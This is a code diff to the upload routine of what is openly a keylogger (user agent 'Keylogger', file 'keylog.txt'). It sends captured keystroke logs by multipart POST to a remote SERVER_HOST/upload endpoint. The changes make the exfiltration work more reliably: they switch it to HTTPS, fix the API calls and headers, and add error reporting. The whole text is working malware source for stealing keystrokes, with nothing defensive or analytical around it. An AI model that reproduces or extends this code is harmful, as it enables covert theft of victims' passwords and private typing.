@@ -44,18 +44,18 @@ void sendToApi(const std::string &filename)
     std::string body;
     body += "--" + boundary + "\r\n";
     body += "Content-Disposition: form-data; name=\"file\"; filename=\"keylog.txt\"\r\n";
+    body += "Content-Type: text/plain\r\n";
     body += fileData;
     body += "\r\n--" + boundary + "--\r\n";
 
     std::string contentType = "Content-Type: multipart/form-data; boundary=" + boundary;
     std::wstring wContentType(contentType.begin(), contentType.end());
 
-    HINTERNET hInternet = InternetOpen(L"Keylogger", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+    HINTERNET hInternet = InternetOpenA("Keylogger", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
     if (!hInternet)
         return;
 
-    std::wstring wServerHost(SERVER_HOST, SERVER_HOST + strlen(SERVER_HOST));
-    HINTERNET hConnect = InternetConnectW(hInternet, wServerHost.c_str(), INTERNET_DEFAULT_HTTP_PORT,
+    HINTERNET hConnect = InternetConnectA(hInternet, SERVER_HOST, INTERNET_DEFAULT_HTTPS_PORT,
                                           NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
     if (!hConnect)
     {
@@ -63,8 +63,9 @@ void sendToApi(const std::string &filename)
         return;
     }
 
-    HINTERNET hRequest = HttpOpenRequestW(hConnect, L"POST", L"/upload", NULL,
-                                          NULL, NULL, 0, 0);
+    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/upload", NULL,
+                                          NULL, NULL,
+                                          INTERNET_FLAG_SECURE, 0);
     if (!hRequest)
     {
         InternetCloseHandle(hConnect);
@@ -72,8 +73,9 @@ void sendToApi(const std::string &filename)
         return;
     }
 
-    BOOL sent = HttpSendRequestW(hRequest, wContentType.c_str(), -1L,
+    BOOL sent = HttpSendRequestA(hRequest, contentType.c_str(), -1L,
                                  (LPVOID)body.c_str(), body.length());
+    DWORD err = GetLastError();
 
     // Check http response
     if (sent)
@@ -92,7 +94,7 @@ void sendToApi(const std::string &filename)
     }
     else
     {
-        printf("[!] HttpSendRequest failed.\n");
+        printf("[!] HttpSendRequest failed. With error %lu\n", err);
     }
 
 
